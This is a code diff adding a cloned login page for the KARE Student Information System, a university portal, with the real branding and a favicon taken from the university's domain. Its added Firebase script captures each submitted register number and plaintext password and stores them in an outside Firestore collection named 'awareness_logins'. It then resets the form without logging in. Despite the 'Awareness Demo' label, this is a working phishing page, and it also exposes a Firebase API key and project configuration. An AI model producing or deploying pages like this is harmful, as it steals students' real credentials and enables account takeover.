@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Student Information System">
+<meta name="author" content="Selvakumar Sankaravel">
+
+<title>Student Information System - KARE-SIS</title>
+
+<!-- Original CSS -->
+<link rel="stylesheet" href="./aravind_files/login.css">
+
+<style>
+/* keep original behavior */
+.touch .login-content {
+  margin-top: auto !important;
+}
+
+/* 🔥 BACKGROUND IMAGE ALIGNMENT FIX */
+.login-bg {
+  position: relative;
+  width: 100%;
+  height: 100vh;
+  overflow: hidden;
+}
+
+.login-bg img.login-logo {
+  position: relative;
+  z-index: 2;
+}
+
+.login-bg .bg-image {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 1;
+}
+</style>
+
+<link rel="shortcut icon" href="https://student.kalasalingam.ac.in/favicon.png">
+</head>
+
+<body class="login">
+
+<div class="user-login-5">
+  <div class="row bs-reset">
+
+    <!-- LEFT SIDE IMAGE -->
+    <div class="col-md-6 bs-reset">
+      <div class="login-bg">
+        <img class="login-logo" src="./aravind_files/kare_logo.png" alt="Logo">
+        <img class="bg-image" src="./aravind_files/bg3.jpg" alt="Background">
+      </div>
+    </div>
+
+    <!-- RIGHT SIDE LOGIN -->
+    <div class="col-md-6 login-container bs-reset">
+      <div class="login-content">
+
+        <h1>Login - SIS</h1>
+        <p>Student Information System - KARE</p>
+
+        <!-- 🔴 ONLY CHANGE: no action, no method -->
+        <form id="loginForm" class="login-form" novalidate>
+
+          <div class="row">
+            <div class="col-xs-12 col-sm-6">
+              <div class="marginb">
+                <input class="form-control form-control-solid placeholder-no-fix"
+                       type="text"
+                       placeholder="Register No"
+                       name="register_no"
+                       required>
+              </div>
+            </div>
+
+            <div class="col-xs-12 col-sm-6">
+              <div class="marginb">
+                <input class="form-control form-control-solid placeholder-no-fix"
+                       type="password"
+                       placeholder="Password"
+                       name="password"
+                       required>
+              </div>
+            </div>
+          </div>
+
+          <div class="row">
+            <div class="col-sm-6">
+              <label class="rememberme mt-checkbox mt-checkbox-outline">
+                <input type="checkbox"> Remember me
+                <span></span>
+              </label>
+            </div>
+
+            <div class="col-sm-6 text-right">
+              <button class="btn green" type="submit">Sign In</button>
+            </div>
+          </div>
+
+        </form>
+
+      </div>
+
+      <div class="login-footer">
+        <div class="row bs-reset">
+          <div class="col-md-5 bs-reset">
+            <ul class="login-social">
+              <li><a target="_blank" href="#"><i class="icon-social-facebook"></i></a></li>
+              <li><a target="_blank" href="#"><i class="icon-social-twitter"></i></a></li>
+              <li><a target="_blank" href="#"><i class="icon-social-youtube"></i></a></li>
+            </ul>
+          </div>
+          <div class="col-md-7 bs-reset">
+            <div class="login-copyright text-right">
+              <p>Copyright © SDT-KARE</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ================= FIREBASE (ONLY ADDITION) ================= -->
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp }
+  from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+/* YOUR FIREBASE CONFIG */
+const firebaseConfig = {
+  apiKey: "AIzaSyAOKAJx0Effli7vmfary871xi1w2i1CNqw",
+  authDomain: "ones-3b948.firebaseapp.com",
+  projectId: "ones-3b948",
+  storageBucket: "ones-3b948.firebasestorage.app",
+  messagingSenderId: "509898133301",
+  appId: "1:509898133301:web:0b57297202da5336a0867c",
+  measurementId: "G-D5MZBLDJS9"
+};
+
+/* INIT FIREBASE */
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+/* STORE DATA ON SIGN IN */
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const reg = e.target.register_no.value.trim();
+  const pass = e.target.password.value.trim();
+
+  if (!reg || !pass) return;
+
+  try {
+    await addDoc(collection(db, "awareness_logins"), {
+      register_no: reg,
+      password_entered: pass,
+      created_at: serverTimestamp(),
+      purpose: "Awareness Demo"
+    });
+
+    e.target.reset();
+  } catch (err) {
+    console.error("Firebase error:", err);
+  }
+});
+
+</script>
+
+</body>
+</html>
